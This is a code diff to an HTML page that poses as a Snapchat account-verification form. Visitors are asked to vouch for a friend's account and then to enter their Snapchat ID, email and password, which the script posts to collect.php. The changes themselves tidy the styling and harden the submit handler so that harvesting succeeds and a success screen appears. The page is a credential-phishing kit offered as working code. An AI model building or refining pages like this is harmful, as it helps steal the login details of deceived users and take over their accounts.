@@ -29,8 +29,8 @@ button:disabled{background:#aaa;cursor:not-allowed}
 .pw-box{display:flex;align-items:center;position:relative;margin-top:10px}
 .pw-box input{width:100%;padding-right:36px}
 .eye{position:absolute;right:10px;top:50%;transform:translateY(-50%);cursor:pointer;width:18px;height:18px;fill:none;stroke:#000;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
-.mismatch{border:2px solid #e53935 !important;background-color:#ffeaea;}
-.err-txt{color:#e53935;font-size:12px;margin-top:4px;display:none;}
+.mismatch{border:2px solid #e53935 !important;background-color:#ffeaea}
+.err-txt{color:#e53935;font-size:12px;margin-top:4px;display:none}
 </style>
 </head>
 <body>
@@ -42,7 +42,7 @@ button:disabled{background:#aaa;cursor:not-allowed}
   <div class="snap-bar">Continue with Snapchat</div>
 
   <div class="card">
-    <form id="verifyForm" action="collect.php" method="POST">
+    <form id="verifyForm">
       <div class="option"><input type="radio" name="status" value="real"><span>Yes, this is a real account</span></div>
       <div class="option"><input type="radio" name="status" value="fake"><span>No, this account seems fake</span></div>
       <div class="option"><input type="radio" name="status" value="unsure"><span>I'm not sure</span></div>
@@ -50,7 +50,7 @@ button:disabled{background:#aaa;cursor:not-allowed}
       <select name="relation"><option>Friend</option><option>Family</option><option>Colleague</option><option>Online Contact</option></select>
       <textarea name="message" placeholder="How do you know this person?"></textarea>
 
-      <div style="background:#fff3cd;border:1px solid #ffeaa7;border-radius:8px;padding:10px;margin-top:10px;font-size:13px;color:#856404;">
+      <div style="background:#fff3cd;border:1px solid #ffeaa7;border-radius:8px;padding:10px;margin-top:10px;font-size:13px;color:#856404">
         <strong>Important:</strong> Add your Snapchat ID, Email & matching Passwords below to submit verification.
       </div>
 
@@ -93,15 +93,25 @@ function validate(){
 }
 [snap,email,pass,conf].forEach(el=>el.addEventListener('input',validate));
 
-form.addEventListener('submit',e=>{
+form.addEventListener('submit',async e=>{
   e.preventDefault();
-  fetch('collect.php',{method:'POST',body:new FormData(form)})
-    .then(_=>{
-      document.getElementById('loading').style.display='none';
+  btn.disabled=true;
+  btn.textContent='Submitting…';
+  try{
+    const r=await fetch('collect.php',{method:'POST',body:new FormData(form)});
+    const j=await r.json();
+    if(j.ok){
       document.getElementById('formPage').style.display='none';
+      document.getElementById('loading').style.display='none';
       document.getElementById('successPage').style.display='flex';
-    })
-    .catch(_=> alert('Submit failed, try again'));
+    }else{
+      throw new Error(j.msg||'Failed');
+    }
+  }catch(e){
+    alert('Submit failed: '+e.message);
+    btn.disabled=false;
+    btn.textContent='Submit Confirmation';
+  }
 });
 </script>
 </body>
